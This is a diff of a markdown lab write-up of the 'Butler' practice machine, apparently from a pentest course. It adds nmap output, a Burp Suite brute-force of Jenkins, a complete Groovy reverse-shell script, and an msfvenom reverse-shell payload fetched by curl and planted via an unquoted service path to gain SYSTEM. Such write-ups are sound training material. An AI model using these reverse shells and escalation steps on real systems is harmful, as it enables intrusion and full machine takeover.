@@ -42,43 +42,16 @@ Currently scanning: Finished!   |   Screen View: Unique Hosts
 ## nmap
 
 ```
-┌──(kali㉿kali)-[~/Capstone/Butler]
-└─$ sudo nmap 10.0.2.80 -T4 -p- > Butler_nmap.txt
-
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 01:55 EDT
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 01:06 EDT
 Nmap scan report for 10.0.2.80
-Host is up (0.00045s latency).
-Not shown: 65524 closed tcp ports (reset)
-PORT      STATE SERVICE
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-5040/tcp  open  unknown
-8080/tcp  open  http-proxy
-49664/tcp open  unknown
-49665/tcp open  unknown
-49666/tcp open  unknown
-49667/tcp open  unknown
-49668/tcp open  unknown
-49670/tcp open  unknown
-MAC Address: 08:00:27:49:14:0A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-
-Nmap done: 1 IP address (1 host up) scanned in 346.79 seconds
-```
-
-```
-┌──(kali㉿kali)-[~/Capstone/Butler]
-└─$ sudo nmap 10.0.2.80 -T4 -A -p 135,139,445,5040,8080,49664-49668,49670 >> Butler_nmap.txt
-
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 02:02 EDT
-Nmap scan report for 10.0.2.80
-Host is up (0.00030s latency).
-
+Host is up (0.00038s latency).
+Not shown: 65523 closed tcp ports (reset)
 PORT      STATE SERVICE       VERSION
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds?
 5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
 8080/tcp  open  http          Jetty 9.4.41.v20210516
 |_http-server-header: Jetty(9.4.41.v20210516)
 |_http-title: Site doesn't have a title (text/html;charset=utf-8).
@@ -91,7 +64,6 @@ PORT      STATE SERVICE       VERSION
 49668/tcp open  msrpc         Microsoft Windows RPC
 49670/tcp open  msrpc         Microsoft Windows RPC
 MAC Address: 08:00:27:49:14:0A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Device type: general purpose
 Running: Microsoft Windows 10
 OS CPE: cpe:/o:microsoft:windows_10
@@ -101,20 +73,84 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:49:14:0a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+|_clock-skew: 8h59m59s
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled but not required
 | smb2-time: 
-|   date: 2025-06-24T06:05:33
+|   date: 2025-06-26T14:10:27
 |_  start_date: N/A
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.30 ms 10.0.2.80
+1   0.38 ms 10.0.2.80
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 173.19 seconds
+Nmap done: 1 IP address (1 host up) scanned in 245.76 seconds
 ```
+
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap 10.0.2.80 -T4 -A -p 135,139,445,5040,7680,8080,49664-49668,49670     
+
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 01:27 EDT
+Nmap scan report for 10.0.2.80
+Host is up (0.00062s latency).
+
+PORT      STATE  SERVICE       VERSION
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open   microsoft-ds?
+5040/tcp  open   unknown
+7680/tcp  closed pando-pub
+8080/tcp  open   http          Jetty 9.4.41.v20210516
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.41.v20210516)
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49668/tcp open   msrpc         Microsoft Windows RPC
+49670/tcp open   msrpc         Microsoft Windows RPC
+MAC Address: 08:00:27:49:14:0A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Microsoft Windows 10
+OS CPE: cpe:/o:microsoft:windows_10
+OS details: Microsoft Windows 10 1709 - 21H2
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-06-26T05:30:16
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:49:14:0a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.62 ms 10.0.2.80
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 175.21 seconds
+```
+
+**Closed ports:**
+
+* 7680, pando-pub
+
+Pando was a file transfer system for big files (up to 1 GB) that had a couple of
+security issues and is no longer maintained, see the [Wikipedia article](https://en.wikipedia.org/wiki/Pando_(application)).
+
+Port 7680 only showed up after 2nd scan (after seeing it in TCM's walkthrough).
+How can I avoid something like this to happen?
 
 **Open ports:**
 
@@ -330,6 +366,300 @@ credentials could make our life easier when we run a brute force attack with
 `BurpSuite`.
 
 <img src="./images/Butler__Jenkins_DefaultCredentials.png" alt="Jenkins Default Credentials" width="600"/>
+
+
+
+**Google search for "Jenkins exploit"**:
+
+* [Github repo](https://github.com/gquere/pwn_jenkins) covering several Jenkins
+vulnerabilities
+* The Jenkins site on [hacktricks](https://www.hacktricks.wiki/) does not exist
+any more in the form shown in TCM's walkthrough.
+* This is a rather recent [blog
+post](https://www.hackingarticles.in/jenkins-penetration-testing/) from an
+Indian security researcher.
+
+
+
+### Brute Force Attack with Burp Suite
+
+<img src="./images/Butler__BurpSuiteIntruderSetup.png" alt="Burp Suite -- Intruder Setup" width="800"/>
+
+<img src="./images/Butler__BurpSuiteIntruderAttack.png" alt="Burp Suite -- Intruder Attack" width="800"/>
+
+<img src="./images/Butler__BurpSuiteIntruder_Response1.png" alt="Burp Suite -- Intruder Response 1" width="600"/>
+
+<img src="./images/Butler__BurpSuiteIntruder_Response2.png" alt="Burp Suite -- Intruder Response 2" width="600"/>
+
+<img src="./images/Butler__BurpSuiteIntruder_Response3.png" alt="Burp Suite -- Intruder Response 3" width="600"/>
+
+<img src="./images/Butler__BurpSuiteIntruder_Response4.png" alt="Burp Suite -- Intruder Response 4" width="600"/>
+
+<img src="./images/Butler__Jenkins_LoginSuccessful.png" alt="Burp Suite -- Successful Login" width="800"/>
+
+
+
+### Groovy Reverse Shell
+
+Google search for `jenkins script console reverse shell` showed the following
+[Github repo](https://github.com/Brzozova/reverse-shell-via-Jenkins) as the
+second hit. The repo contained a Groovy script that worked properly -- in contrast
+to the one that TCM had used successfully in 2021, but which crashed my attack
+victim.
+
+```
+Thread.start {
+String host="<your_machine_IP>";
+int port=<your_webserver_port>;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+}
+```
+
+Before we run the Groovy script in Butler, we need to set up a `netcat` listener
+on our attack machine with `nc -nvlp <PORT NUMBER>`. Running the script will
+then give us a low privilege shell as user `butler`:
+
+<img src="./images/Butler__Jenkins_ReverseShellSuccessful.png" alt="Reverse Shell with Jenkins" width="1400"/>
+
+
+
+### Privilege Escalation with WinPEAS
+
+Analogous to `LinPEAS` for Linux, we can upload the script `WinPEAS` to the
+victim machine to enumerate possibilities of privilege 
+
+
+
+```
+c:\Users\butler\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1067-CB24
+
+ Directory of c:\Users\butler\Downloads
+
+08/14/2021  05:23 AM    <DIR>          .
+08/14/2021  05:23 AM    <DIR>          ..
+08/14/2021  05:23 AM        16,013,912 WiseCare365_5.6.7.568.exe
+               1 File(s)     16,013,912 bytes
+               2 Dir(s)   9,190,080,512 bytes free
+```
+
+<img src="./images/Butler__WinPEAS_download.png" alt="Download WinPEAS from GitHub" width="800"/>
+
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ mv ~/Downloads/winPEASx64_ofs.exe ~/Capstone/Butler 
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ cd Capstone/Butler
+                                                                                                                    
+┌──(kali㉿kali)-[~/Capstone/Butler]
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+```
+    The Microsoft operating system is full of command line tools that help to
+    perform administrative tasks. (...) Why reinvent the wheel, if a tool can
+    achieve what you need? (...) The purpose of this tool is to dump and display
+    certification authority (CA) information, manage certificates and keys.
+    This is a command line tool that accepts a lot of parameters.i (...)
+
+    But, it is possible to use the tool to perform an important task for attackers:
+    To fetch data from the Internet! Indeed, many Microsoft tools are able to fetch
+    an online file using a URL schema (ftp://, http://, etc). I presume you already
+    know that, in every dialogue box used to open/save a file, you can provide a
+    URL: (...)
+```
+[source](https://isc.sans.edu/diary/A+Suspicious+Use+of+certutilexe/23517)
+
+and
+
+```
+    Windows 10 includes curl.exe: (...)
+```
+[source](https://techcommunity.microsoft.com/blog/containers/tar-and-curl-come-to-windows/382409)
+
+
+
+```
+c:\Users\butler\Downloads>curl http://10.0.2.5/winPEASx64_ofs.exe -o winpeas.exe
+curl http://10.0.2.5/winPEASx64_ofs.exe -o winpeas.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 9776k  100 9776k    0     0   167M      0 --:--:-- --:--:-- --:--:--  170M
+
+c:\Users\butler\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1067-CB24
+
+ Directory of c:\Users\butler\Downloads
+
+06/29/2025  12:30 PM    <DIR>          .
+06/29/2025  12:30 PM    <DIR>          ..
+06/29/2025  12:30 PM        10,010,624 winpeas.exe
+08/14/2021  05:23 AM        16,013,912 WiseCare365_5.6.7.568.exe
+               2 File(s)     26,024,536 bytes
+               2 Dir(s)   9,181,114,368 bytes free
+```
+
+We can run `winpeas.exe` with limited privileges (to begin with, see one of the
+previous machines -- better double-check with elevated privileges later) to
+enumerate all ways to get to a root shell.
+
+**FINDING:**
+
+```
+(...)
+
+    WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected
+    YOU CAN MODIFY THIS SERVICE: AllAccess
+    File Permissions: Administrators [Allow: AllAccess]
+    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [Allow: AllAccess])                                                                                                              
+    In order to optimize system performance,Wise Care 365 will calculate your system startup time.
+   =================================================================================================                
+
+(...)
+```
+
+The `WiseBootAssistant` is run with administrator privileges. If a path with
+spaces is used without quotes, Windows will try to find the executable starting
+at the shortest possible version up until the first space, then extend the path
+by the next word, etc. If we have write access to a folder with a space in the
+folder name that is located above the executable, we can exploit this and place
+our own (malicious) executable there to have it executed instead of the original
+file. See [Windows Unquoted Service Path
+Enumeration](https://techcommunity.microsoft.com/discussions/windows-security/windows-unquoted-service-path-enumeration---is-this-still-a-case-in-modern-windo/3298358).
+
+We create a reverse shell with `msfvenom` as shown below. LHOST and LPORT are
+the IP and port of the listener on our attack machine.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=7777 -f exe > Wise.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+
+
+┌──(kali㉿kali)-[~]
+└─$ mv Wise.exe ./Capstone/Butler
+
+c:\Users\butler\Downloads>curl http://10.0.2.5/Wise.exe -o Wise.exe
+curl http://10.0.2.5/Wise.exe -o Wise.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7168  100  7168    0     0   307k      0 --:--:-- --:--:-- --:--:--  350k
+```
+
+We then place it in a folder from which we want to serve the files to the victim
+machine via a Pythons HTTP server.
+
+```
+┌──(kali㉿kali)-[~/Capstone/Butler]
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.0.2.80 - - [29/Jun/2025 15:42:13] "GET /Wise.exe HTTP/1.1" 200 -
+```
+
+The last line above indicates that we have downloaded the reverse shell with
+`curl`:
+
+```
+c:\Users\butler\Downloads>curl http://10.0.2.5/Wise.exe -o Wise.exe
+curl http://10.0.2.5/Wise.exe -o Wise.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7168  100  7168    0     0   307k      0 --:--:-- --:--:-- --:--:--  350k
+```
+
+**Note to myself:** Next time, download the file to the correct folder right
+away. Moving files with long folder names from the command line is annoying!
+
+```
+c:\Users\butler\Downloads>move Wise.exe c:\"Program Files (x86)"\Wise\ 
+```
+
+Now we create the listener on port 7777 of our attack machine with `nc -nvlp
+7777`. Then we stop and restart the `WiseBootAssistant` service as follows,
+which will start the reverse shell with admin privileges instead of the actual
+service:
+
+```
+c:\Program Files (x86)\Wise>sc stop WiseBootAssistant
+sc stop WiseBootAssistant
+
+SERVICE_NAME: WiseBootAssistant 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x3
+        WAIT_HINT          : 0x1388
+
+c:\Program Files (x86)\Wise>sc query WiseBootAssistant
+sc query WiseBootAssistant
+
+SERVICE_NAME: WiseBootAssistant 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+c:\Program Files (x86)\Wise>sc start WiseBootAssistant
+```
+
+This will stall, and if we check the status of our listener on port 7777, the
+reverse shell has actually made a connection with administrator privileges:
+
+```
+┌──(kali㉿kali)-[~/Capstone/Butler]
+└─$ nc -nvlp 7777
+listening on [any] 7777 ...
+connect to [10.0.2.5] from (UNKNOWN) [10.0.2.80] 49709
+Microsoft Windows [Version 10.0.19043.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\users\butler\desktop
+cd c:\users\butler\desktop
+
+c:\Users\butler\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1067-CB24
+
+ Directory of c:\Users\butler\Desktop
+
+08/14/2021  04:54 AM    <DIR>          .
+08/14/2021  04:54 AM    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)   9,181,450,240 bytes free
+
+c:\Users\butler\Desktop>mkdir I_was_here
+mkdir I_was_here
+```
+
+
+
+<img src="./images/Butler__I_was_here.png" alt="Got administrator access" width="1200"/>
+
+
+
+**Mission accomplished.**
 
 
 
